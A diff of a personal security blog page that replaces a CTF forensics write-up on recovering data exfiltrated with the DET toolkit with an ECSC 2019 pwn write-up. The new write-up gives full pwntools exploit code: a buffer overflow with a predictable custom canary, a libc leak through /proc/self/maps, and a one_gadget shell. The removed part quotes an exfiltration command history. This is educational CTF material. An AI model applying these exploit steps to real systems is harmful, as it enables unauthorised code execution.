@@ -7,42 +7,40 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="generator" content="Hugo 0.52 with theme Tranquilpeak 0.4.3-SNAPSHOT">
 <meta name="author" content="Hugo VINCENT">
-<meta name="keywords" content="forensic, network, crypto, blog, hacking, Privacy, vie-privée, insa, cybersecurity, infosec, hack">
-<meta name="description" content="Event Challenge Category Points Solves     santhacklausctf mi2 Forensic/Crypto/network 500 22    TL;DR In the second part of the challenge we also had a memory dump of a Debian system and a network capture. When you analyse the network capture you can see that some data were exfiltrated, if you look into the memdup you can see that the tool DET (Data Exfiltration Toolkit), has been used to exfiltrate the data.">
+<meta name="keywords" content="pwn, reverse, blog, hacking, Privacy, vie-privée, insa, cybersecurity, infosec, hack">
+<meta name="description" content="Event Challenge Category Points Solves     ecsc2019 filereader pwn 1000 20    TL;DR We need to exploit binary which read the content of files listed in an other file. A buffer-overflow is present in one of the function and we can leak the address of libc thanks to /proc/self/map since we can read files. A onegadget is then used to pop a shell.">
 
 
-<meta property="og:description" content="Event Challenge Category Points Solves     santhacklausctf mi2 Forensic/Crypto/network 500 22    TL;DR In the second part of the challenge we also had a memory dump of a Debian system and a network capture. When you analyse the network capture you can see that some data were exfiltrated, if you look into the memdup you can see that the tool DET (Data Exfiltration Toolkit), has been used to exfiltrate the data.">
+<meta property="og:description" content="Event Challenge Category Points Solves     ecsc2019 filereader pwn 1000 20    TL;DR We need to exploit binary which read the content of files listed in an other file. A buffer-overflow is present in one of the function and we can leak the address of libc thanks to /proc/self/map since we can read files. A onegadget is then used to pop a shell.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Mission impossible 2">
-<meta name="twitter:title" content="Mission impossible 2">
-<meta property="og:url" content="https://hug0vincent.github.io/2018/12/mission-impossible-2/">
-<meta property="twitter:url" content="https://hug0vincent.github.io/2018/12/mission-impossible-2/">
+<meta property="og:title" content="Filereader">
+<meta name="twitter:title" content="Filereader">
+<meta property="og:url" content="https://hug0vincent.github.io/2019/05/filereader/">
+<meta property="twitter:url" content="https://hug0vincent.github.io/2019/05/filereader/">
 <meta property="og:site_name" content="Hugo">
-<meta property="og:description" content="Event Challenge Category Points Solves     santhacklausctf mi2 Forensic/Crypto/network 500 22    TL;DR In the second part of the challenge we also had a memory dump of a Debian system and a network capture. When you analyse the network capture you can see that some data were exfiltrated, if you look into the memdup you can see that the tool DET (Data Exfiltration Toolkit), has been used to exfiltrate the data.">
-<meta name="twitter:description" content="Event Challenge Category Points Solves     santhacklausctf mi2 Forensic/Crypto/network 500 22    TL;DR In the second part of the challenge we also had a memory dump of a Debian system and a network capture. When you analyse the network capture you can see that some data were exfiltrated, if you look into the memdup you can see that the tool DET (Data Exfiltration Toolkit), has been used to exfiltrate the data.">
+<meta property="og:description" content="Event Challenge Category Points Solves     ecsc2019 filereader pwn 1000 20    TL;DR We need to exploit binary which read the content of files listed in an other file. A buffer-overflow is present in one of the function and we can leak the address of libc thanks to /proc/self/map since we can read files. A onegadget is then used to pop a shell.">
+<meta name="twitter:description" content="Event Challenge Category Points Solves     ecsc2019 filereader pwn 1000 20    TL;DR We need to exploit binary which read the content of files listed in an other file. A buffer-overflow is present in one of the function and we can leak the address of libc thanks to /proc/self/map since we can read files. A onegadget is then used to pop a shell.">
 <meta property="og:locale" content="en-us">
 
   
-    <meta property="article:published_time" content="2018-12-20T00:00:00">
+    <meta property="article:published_time" content="2019-05-21T19:11:39">
   
   
-    <meta property="article:modified_time" content="2018-12-20T00:00:00">
+    <meta property="article:modified_time" content="2019-05-21T19:11:39">
   
   
   
     
       <meta property="article:section" content="write-ups">
     
-      <meta property="article:section" content="santhacklausctf">
+      <meta property="article:section" content="ecsc2019">
     
   
   
     
-      <meta property="article:tag" content="forensic">
+      <meta property="article:tag" content="pwn">
     
-      <meta property="article:tag" content="network">
-    
-      <meta property="article:tag" content="crypto">
+      <meta property="article:tag" content="reverse">
     
   
 
@@ -56,9 +54,6 @@
 
 
 
-  <meta property="og:image" content="https://hug0vincent.github.io/images/mi2/bg.png">
-  <meta property="twitter:image" content="https://hug0vincent.github.io/images/mi2/bg.png">
-
 
 
 
@@ -66,14 +61,14 @@
   <meta property="twitter:image" content="https://hug0vincent.github.io/images/profil.jpg">
 
 
-    <title>Mission impossible 2</title>
+    <title>Filereader</title>
 
     <link rel="icon" href="https://hug0vincent.github.io/favicon.png">
     
 
     
 
-    <link rel="canonical" href="https://hug0vincent.github.io/2018/12/mission-impossible-2/">
+    <link rel="canonical" href="https://hug0vincent.github.io/2019/05/filereader/">
 
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
@@ -245,24 +240,26 @@
 </nav>
 
       
-  <div class="post-header-cover
-              text-center
-              post-header-cover--full"
-       style="background-image:url('/images/mi2/bg.png')"
-       data-behavior="4">
-    
-      <div class="post-header main-content-wrap text-center">
+
+      <div id="main" data-behavior="4"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+            <div class="post-header main-content-wrap text-center">
   
     <h1 class="post-title" itemprop="headline">
-      Mission impossible 2
+      Filereader
     </h1>
   
   
   <div class="postShorten-meta post-meta">
     
-      <time itemprop="datePublished" datetime="2018-12-20T00:00:00Z">
+      <time itemprop="datePublished" datetime="2019-05-21T19:11:39&#43;02:00">
         
-  December 20, 2018
+  May 21, 2019
 
       </time>
     
@@ -273,23 +270,13 @@
     
       <a class="category-link" href="https://hug0vincent.github.io/categories/write-ups">write-ups</a>, 
     
-      <a class="category-link" href="https://hug0vincent.github.io/categories/santhacklausctf">santhacklausctf</a>
+      <a class="category-link" href="https://hug0vincent.github.io/categories/ecsc2019">ecsc2019</a>
     
   
 
   </div>
 
 </div>
-    
-  </div>
-
-
-      <div id="main" data-behavior="4"
-        class="hasCover
-               hasCoverMetaIn
-               ">
-        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
-          
           
           <div class="post-content markdown" itemprop="articleBody">
             <div class="main-content-wrap">
@@ -308,24 +295,22 @@
 
 <tbody>
 <tr>
-<td align="center">santhacklausctf</td>
-<td align="center">mi2</td>
-<td align="center">Forensic/Crypto/network</td>
-<td align="center">500</td>
-<td align="center">22</td>
+<td align="center">ecsc2019</td>
+<td align="center">filereader</td>
+<td align="center">pwn</td>
+<td align="center">1000</td>
+<td align="center">20</td>
 </tr>
 </tbody>
 </table>
 
 <h1 id="tl-dr">TL;DR</h1>
 
-<p>In the second part of the challenge we also had a memory dump of a Debian system and a network capture. When you analyse the network capture you can see that some data were exfiltrated, if you look into the memdup you can see that the tool <a href="https://github.com/sensepost/DET">DET</a> (Data Exfiltration Toolkit), has been used to exfiltrate the data. You can also recover the encryption key for the data and a zip file which contain the flag.</p>
+<p>We need to exploit binary which read the content of files listed in an other file. A buffer-overflow is present in one of the function and we can leak the address of libc thanks to <em>/proc/self/map</em> since we can read files. A onegadget is then used to pop a shell.</p>
 
-<h1 id="introduction">Introduction</h1>
+<h1 id="recon">Recon</h1>
 
-<p>Actually I solved this challenge before <a href="http://localhost:1313/2018/12/mission-impossible-1/">mi1</a> and I only used <span class="highlight-text orange">strings</span> to analyse the memory dump because I wasn&rsquo;t aware of linux profile for volatility.</p>
-
-<p>I started by analysing the <span class="highlight-text orange">challenge.pcapng</span>, I quickly saw some weird data in the ICMP and in the HTTP packets. It look like base64 encoding. I coded a little script in python to extract everything.</p>
+<p>First we check the protections, NX and PIE are enabled which mean we won&rsquo;t be able neither to execute code nor use gadgets to do a ropchain.</p>
 
 
 
@@ -340,12 +325,16 @@
       
     
   
+    
+      
+    
+  
 
-<div class="figure fig-100" >
+<div class="figure fig-100 center" >
   
-    <a class="fancybox" href="https://hug0vincent.github.io/images/mi2/icmp.png" data-fancybox-group="">
+    <a class="fancybox" href="https://hug0vincent.github.io/images/filereader/sec.png" data-fancybox-group="">
   
-    <img class="fig-img" src="https://hug0vincent.github.io/images/mi2/icmp.png" >
+    <img class="fig-img" src="https://hug0vincent.github.io/images/filereader/sec.png" >
   
     </a>
   
@@ -353,7 +342,9 @@
 </div>
 
 
-<p></br></p>
+<p>The binary ask for a file which should contain a list of other files. Then it will display the content of each file if the permissions are ok. I load the binary into ghidra and spot many interesting things.</p>
+
+<p>First we can spot a buffer overflow in the <span class="highlight-text orange">fscanf</span> function which doesn&rsquo;t check for the size of the filename. (<em>local_118</em> is a pointer to the file containing the filenames of the files to read and <em>auStack272</em> is a 260 bytes long buffer)</p>
 
 
 
@@ -368,12 +359,16 @@
       
     
   
+    
+      
+    
+  
 
-<div class="figure fig-100" >
+<div class="figure fig-100 center" >
   
-    <a class="fancybox" href="https://hug0vincent.github.io/images/mi2/post.png" data-fancybox-group="">
+    <a class="fancybox" href="https://hug0vincent.github.io/images/filereader/fscanf.png" data-fancybox-group="">
   
-    <img class="fig-img" src="https://hug0vincent.github.io/images/mi2/post.png" >
+    <img class="fig-img" src="https://hug0vincent.github.io/images/filereader/fscanf.png" >
   
     </a>
   
@@ -381,8 +376,124 @@
 </div>
 
 
+<p>But we have to bypass some custom stack cookies, indeed the binary is not stripped and we can see the <span class="highlight-text orange">canarie</span> variable wich is push on the stack at the beginning of the execution :</p>
+
+
+
+ 
+  
+  
+  
+  
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+
+<div class="figure fig-100 center" >
+  
+    <a class="fancybox" href="https://hug0vincent.github.io/images/filereader/canarie1.png" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/filereader/canarie1.png" >
+  
+    </a>
+  
+  
+</div>
+
+
+<p>And then checked at the end.</p>
+
+
+
+ 
+  
+  
+  
+  
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+
+<div class="figure fig-100 center" >
+  
+    <a class="fancybox" href="https://hug0vincent.github.io/images/filereader/canarie2.png" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/filereader/canarie2.png" >
+  
+    </a>
+  
+  
+</div>
+
+
+<p>It&rsquo;s not secure at all since the <span class="highlight-text orange">pid</span> can be predicted and so the canarie can be forged to bypass the protection.</p>
+
+<h1 id="exploit-part1">Exploit part1</h1>
+
+<p>We now have everything to start writing our exploit, I like python for pwn challenge, but the random implementation of python is different from the one used in C so I wrote a really simple program which return a random number depending of the input like in the binary.</p>
+
 
   
+    
+  
+  
+    
+  
+  
+  
+
+
+<figure class="highlight c language-c">
+  <figcaption>
+    
+      <span>rand.c</span>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-c"><code class="c">#include &lt;stdio.h&gt;
+
+int main(int argc, char **argv)
+{
+  int pid = atoi(argv[1]);
+  int canarie = 0;
+  srand(pid);
+  canarie = rand();
+  printf(&#34;%d\n&#34;, canarie);
+}</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<p>Let start writing some python and see :</p>
+
+
+  
+    
+  
+  
+    
   
   
   
@@ -391,282 +502,96 @@
 <figure class="highlight python language-python">
   <figcaption>
     
-  </figcaption>
-  <table>
-    <tbody>
-      <tr>
-        <td class="gutter">
-          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre>
-        </td>
-        <td class="code">
-          <pre class="code-highlight language-python"><code class="python">#!/usr/bin/python3
-
-import pyshark
-import base64
-
-FILE = &#34;./challenge.pcapng&#34;
-
-def getData(pkt):
-    try:
-        if pkt[&#39;URLENCODED-FORM&#39;]:
-            return handleHttp(pkt)
-
-    except Exception:
-        pass
-
-    try:
-        if pkt[&#39;ICMP&#39;]:
-            return handleICMP(pkt)
-
-    except Exception as e:
-        #print(pkt)
-        return None
-
-def handleHttp(pkt):
-    #print (pkt)
-    raw = pkt[&#39;URLENCODED-FORM&#39;]
-    return base64.b64decode(raw.value)
-
-def handleICMP(pkt):
-    raw = pkt[&#39;ICMP&#39;]
-    b64 = bytes.fromhex(raw.data).decode(&#39;utf-8&#39;)
-    return base64.b64decode(b64)
-
-
-pkts = pyshark.FileCapture(FILE)
-
-for pkt in pkts:
-    if pkt[&#39;ip&#39;].src == &#34;192.168.0.26&#34;:
-
-        data = getData(pkt)
-        if data != None:
-            print (data)</code></pre>
-        </td>
-      </tr>
-    </tbody>
-  </table>
-</figure>
-
-<p>When we run the script we get something like this :</p>
-
-<pre><code>b'z6f9HaX|!|flag.zip|!|REGISTER|!|3682490664d5bf7905397710edb84737'
-[...]
-b'z6f9HaX|!|72|!|2363668a94e3da3f34f7686d4dd3ea86505fefe92d42e88fcfde89bea382d982476c0f44e65b894091725439a2df35b69bdb865e8d6fae119aa481273f19a2340aed08ba71997e1363f215837559276bbec9eb77bc1722a18f433e51bcbc5bc77898eadc86a7eab266cef5d345d58268e2d35d1775d2c58712f7637e4d6b138dd45b94f514d376c2c7c905f82e0247974553c307b5bc93862d646e9dcdc2ee6e640b458685d35d7782ee40b435d84cd1724cada58c488ec2fbb823933df97a194c046c0ca65c52a4f7f39e85496413f57464299a37eca32a992e29715ccb05a87c06c17f98a2d8ffa8206c11bd322cce9c3dd1f7f2725be2f19e1936d5ebe7cbf9063f0692bc1bb24c01d518e9d23b06a9b10270856ef38ddab12f598ce6fea4c1d114873e0e7e64ae697789e14133e9528667ba'
-b'z6f9HaX|!|73|!|7a7c9bd3087fd44bf22ca7166bb9d3a8c9e720149d4accced33349e1ba5e64f8d71247551904fc6fc0d97f3dfcd153517ff0868216ee2f70c67bb272246022263c8ccba649a8e1b75f59c629a245d6a23bcf4d98a362ca4ad3c7f5d89dddd3fcc3274a9df2c8b23acd88a6674284a3caa56d490c06f699e3a9756694ea56ccce24ecfb3b948772741ef42f76cbc5142808696ea0c5c278f48b4cd8cd8fdd81a23b2c075a6e6a5776a08f7b6115494b20805abecbea32b23d7d224f90d361fc770bc07b8e7a265a'
-b'z6f9HaX|!|74|!|DONE'
-</code></pre>
-
-<p>The file <span class="highlight-text orange">flag.zip</span> seems to be what we are looking for. I tried to look at the hexadecimal data in each packet but no trace of a zip file signature. It&rsquo;s time to look at the memorydump.</p>
-
-<h1 id="digging-into-the-memdump">Digging into the memdump</h1>
-
-<p>I used <em>strings</em> with <em>grep</em> and the <em>A/B</em> option of grep which print some line after/before what you are looking for.</p>
-
-<pre><code>$ strings challenge.raw | grep -A 5 -B 5 flag.zip
-[...]
-sudo git clone https://github.com/sensepost/DET
-[...]
-    5  ls -alh
-    6  sudo chown -R evil-hacker:evil-hacker /opt/DET/
-    7  cp config-sample.json config.json 
-    8  nano config.json 
-    9  cp -v /media/evil-hacker/DISK_IMG/FOR05/flag.jpg .
-   10  zip flag.zip flag.jpg -P <span class="highlight-text orange">IMTLD{N0t_Th3_Fl4g}</span>
-   11  rm flag.jpg 
-   12  sudo python det.py -c config.json -p icmp,http -f flag.zip 
-   13  rm flag.zip 
-   14  history
-[...]
-</code></pre>
-
-<p>Our <span class="highlight-text orange">evil-hacker</span> used the script det.py tho exfiltrate the encrypted file flag.zip. If we look into the github repository we can learn more about this tool.</p>
-
-<h1 id="det-py">Det.py</h1>
-
-<blockquote>
-  <p>
-DET (is provided AS IS), is a proof of concept to perform Data Exfiltration using either single or multiple channel(s) at the same time.
-</p>
-  <footer>
-    <strong></strong>
-    
-      
-        <cite></cite>
-      
-    
-  </footer>
-</blockquote>
-
-<blockquote>
-  <p>
-In order to use DET, you will need to configure it and add your proper settings (eg. SMTP/IMAP, AES256 encryption passphrase and so on). A configuration example file has been provided and is called: config-sample.json
-</p>
-  <footer>
-    <strong></strong>
-    
-      
-        <cite></cite>
-      
-    
-  </footer>
-</blockquote>
-
-<p>Inside the script there is this interesting part :</p>
-
-
-  
-  
-  
-  
-
-
-<figure class="highlight python language-python">
-  <figcaption>
+      <span>exploit.py</span>
     
   </figcaption>
   <table>
     <tbody>
       <tr>
         <td class="gutter">
-          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre>
         </td>
         <td class="code">
-          <pre class="code-highlight language-python"><code class="python"># sending the data
-f = tempfile.SpooledTemporaryFile()
-e = open(self.file_to_send, &#39;rb&#39;)
-data = e.read()
-if COMPRESSION:
-    data = compress(data)
-f.write(aes_encrypt(data, self.exfiltrate.KEY))
-f.seek(0)
-e.close()   </code></pre>
+          <pre class="code-highlight language-python"><code class="python">from pwn import *
+import os
+
+FILE = &#34;/tmp/file&#34;
+
+pid = os.getpid()
+log.info(&#34;pid : &#34;&#43;str(pid))
+
+#Return the canarie from the predicted pid
+p = process([&#39;./rand&#39;, str(pid&#43;5)])
+canarie = p.recvline().strip()
+p.close()
+
+log.info(&#34;canarie : &#34;&#43;str(canarie))
+
+#size of the buffer containing the filename
+offset = 260
+
+payload = &#34;&#34;
+payload &#43;= &#34;A&#34; * offset
+payload &#43;= p64(int(canarie))
+payload &#43;= p32(0x0)             #ebp
+payload &#43;= p64(0xdeadbeef)      #return address
+
+f = open(FILE, &#39;w&#39;)
+f.write(payload)
+f.close()
+
+r = process([&#39;./filereader&#39;, &#39;/tmp/file&#39;])
+print r.recvall()</code></pre>
         </td>
       </tr>
     </tbody>
   </table>
 </figure>
 
-<p>The exfiltrated file is first compress and then encrypted with a key which is located inside the file <span class="highlight-text orange">config.json</span>. The default key can be found on the github repository.</p>
+<p>I found that the filereader binary would be launched with a pid increased by 5 from the python script. Then run it&hellip; and we don&rsquo;t have the message saying <em>Stack smashing detected!</em> anymore, instead we have a <span class="highlight-text orange">segfault</span> due to <span class="highlight-text orange">0xdeadbeef</span> address.</p>
 
 
+
+ 
   
   
   
   
-
-
-<figure class="highlight json language-json">
-  <figcaption>
     
-  </figcaption>
-  <table>
-    <tbody>
-      <tr>
-        <td class="gutter">
-          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>
-        </td>
-        <td class="code">
-          <pre class="code-highlight language-json"><code class="json">[...]
-&#34;AES_KEY&#34;: &#34;THISISACRAZYKEY&#34;,
-&#34;max_time_sleep&#34;: 10,
-&#34;min_time_sleep&#34;: 1,
-&#34;max_bytes_read&#34;: 400,
-&#34;min_bytes_read&#34;: 300,
-&#34;compression&#34;: 1</code></pre>
-        </td>
-      </tr>
-    </tbody>
-  </table>
-</figure>
-
-<p>Obviously the encryption key was modified for the CTF. We need that key to recover the zip file.</p>
-
-<pre><code class="language-json">$ strings challenge.raw | grep -A 5 -B 5 AES_KEY
-[...]
-&quot;AES_KEY&quot;: &quot;<span class="highlight-text orange">IMTLD{This_is_just_a_key_not_the_flag}</span>&quot;,
-&quot;max_time_sleep&quot;: 10,
-&quot;min_time_sleep&quot;: 1,
-&quot;max_bytes_read&quot;: 400,
-&quot;min_bytes_read&quot;: 300,
-&quot;compression&quot;: 1
-[...]
-</code></pre>
-
-<h1 id="the-flag">The flag</h1>
-
-<p>Now we have everything we just need a script to get our flag. I used the <span class="highlight-text orange">aes_decrypt</span> function of det.py and modify some parts for <em>python3</em></p>
-
-
   
-  
-  
-  
-
-
-<figure class="highlight python language-python">
-  <figcaption>
     
-  </figcaption>
-  <table>
-    <tbody>
-      <tr>
-        <td class="gutter">
-          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre>
-        </td>
-        <td class="code">
-          <pre class="code-highlight language-python"><code class="python">#!/usr/bin/python3
+      
+    
+  
+    
+      
+    
+  
 
-import hashlib
-from zlib import decompress
-from Crypto.Cipher import AES
-
-def aes_decrypt(message, key=KEY):
-    try:
-        # Retrieve CBC IV
-        iv = message[:AES.block_size]
-        message = message[AES.block_size:]
-
-        # Derive AES key from passphrase
-        aes = AES.new(hashlib.sha256(key.encode(&#39;utf-8&#39;)).digest(), AES.MODE_CBC, iv)
-        message = aes.decrypt(message)
-
-        # Remove PKCS5 padding
-        unpad = lambda s: s[:-ord(s[len(s) - 1:])]
-
-        return unpad(message)
-    except Exception as e:
-        print(e)
-        return None
+<div class="figure fig-100 center" >
+  
+    <a class="fancybox" href="https://hug0vincent.github.io/images/filereader/test1.png" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/filereader/test1.png" >
+  
+    </a>
+  
+  
+</div>
 
 
-pkts = pyshark.FileCapture(FILE)
-print(&#34;[info] Starting&#34;)
-for pkt in pkts:
-    if pkt[&#39;ip&#39;].src == &#34;192.168.0.26&#34;:
+<h1 id="exploit-part2">Exploit part2</h1>
 
-        data = getData(pkt)
-        if data != None:
-            data = parseData(data)
-            if data != None:
-                RET &#43;= data
+<p>Ok, but now what ? Where should we jump since we control <span class="highlight-text orange">rip</span> ? As I said at the beginning no ropchain and no shellcode because of PIE and NX protections. We need to leak an address from the libc and then found a <a href="https://github.com/david942j/one_gadget">onegadget</a> to get our shell. This is the tricky part and I stayed stuck here for some days. But wait we have a binary which read files, so we can read <span class="highlight-text orange">/proc/self/maps</span> which contain the address of the code, the stack, the heap and the libc !</p>
 
-data = bytes.fromhex(RET)
-print(&#34;[info] Decryption&#34;)
-decrypted = aes_decrypt(data,KEY)
-
-zip = open(&#39;flag.zip&#39;,&#39;wb&#39;)
-zip.write(decompress(decrypted))
-
-zip.close()
-print(&#34;[info] Done&#34;)</code></pre>
-        </td>
-      </tr>
-    </tbody>
-  </table>
-</figure>
+<p>My idea was to create a file like this :</p>
 
 
   
+    
+  
+  
+    
   
   
   
@@ -675,28 +600,35 @@ print(&#34;[info] Done&#34;)</code></pre>
 <figure class="highlight bash language-bash">
   <figcaption>
     
+      <span>/tmp/file</span>
+    
   </figcaption>
   <table>
     <tbody>
       <tr>
         <td class="gutter">
-          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
         </td>
         <td class="code">
-          <pre class="code-highlight language-bash"><code class="bash">$ ./mi2.py
-[info] Starting
-[info] Decryption
-[info] Done
-$ unzip -P IMTLD{N0t_Th3_Fl4g} flag.zip 
-Archive:  flag.zip
-  inflating: flag.jpg</code></pre>
+          <pre class="code-highlight language-bash"><code class="bash">/proc/self/maps
+/tmp/a
+/tmp/a
+/tmp/a
+/tmp/a
+[...]
+/tmp/a
+/tmp/a
+/tmp/a
+PAAAAAAAAAAAAAAYLOAD</code></pre>
         </td>
       </tr>
     </tbody>
   </table>
 </figure>
 
-<p>And we have our flag :</p>
+<p>If there is enought <em>/tmp/a</em> the process will be too busy to read them and we will be able to write our payload from the first part at the end of this file.</p>
+
+<p>Before we need the address of a onegadget.</p>
 
 
 
@@ -711,12 +643,142 @@ Archive:  flag.zip
       
     
   
+    
+      
+    
+  
 
-<div class="figure fig-100" >
+<div class="figure fig-100 center" >
   
-    <a class="fancybox" href="https://hug0vincent.github.io/images/mi2/flag.png" data-fancybox-group="">
+    <a class="fancybox" href="https://hug0vincent.github.io/images/filereader/onegadget.png" data-fancybox-group="">
   
-    <img class="fig-img" src="https://hug0vincent.github.io/images/mi2/flag.png" >
+    <img class="fig-img" src="https://hug0vincent.github.io/images/filereader/onegadget.png" >
+  
+    </a>
+  
+  
+</div>
+
+
+<p>Here is the final exploit :</p>
+
+
+  
+    
+  
+  
+    
+  
+  
+  
+
+
+<figure class="highlight python language-python">
+  <figcaption>
+    
+      <span>exploit.py</span>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-python"><code class="python">from pwn import *
+import os
+
+FILE = &#34;/tmp/file&#34;
+TMP_FILE = &#34;/tmp/a&#34;
+MAX = 500
+
+#parse the ouptut of /proc/self/maps
+#and return the address of libc
+def getAddress(r, line):
+    lines = r.split(&#39;\n&#39;)
+    return lines[line].split(&#39;-&#39;)[0]
+
+pid = os.getpid()
+log.info(&#34;pid : &#34;&#43;str(pid))
+
+p = process([&#39;./rand&#39;, str(pid&#43;5)])
+canarie = p.recvline().strip()
+p.close()
+log.info(&#34;canarie : &#34;&#43;str(canarie))
+
+offset = 260
+
+#Write some content to /tmp/a
+f = open(TMP_FILE, &#39;w&#39;)
+f.write(&#39;gonna pwn you&#39;)
+f.close()
+
+f = open(FILE, &#39;w&#39;)
+f.write(&#34;/proc/self/maps\n&#34;)
+
+#fill the file with /tmp/a
+for i in range(0,MAX):
+    f.write(TMP_FILE&#43;&#39;\n&#39;)
+
+f.close()
+
+
+r = process([&#39;./filereader&#39;, &#39;/tmp/file&#39;])
+r.recvline()
+
+maps = r.recvuntil(&#39;Attempting to read file&#39;)
+libc_base = getAddress(maps, 4)
+
+execve = 0x3f306
+jump = execve &#43; int(libc_base,16)
+
+payload = &#34;&#34;
+payload &#43;= &#34;A&#34; * offset
+payload &#43;= p64(int(canarie))
+payload &#43;= p32(0x0)
+payload &#43;= p64(jump)
+
+#a option for append
+f = open(FILE, &#39;a&#39;)
+f.write(payload)
+f.close()
+
+print r.recvline()
+
+#BOOM shell
+r.interactive()</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<h1 id="flag">Flag</h1>
+
+
+
+ 
+  
+  
+  
+  
+    
+  
+    
+      
+    
+  
+    
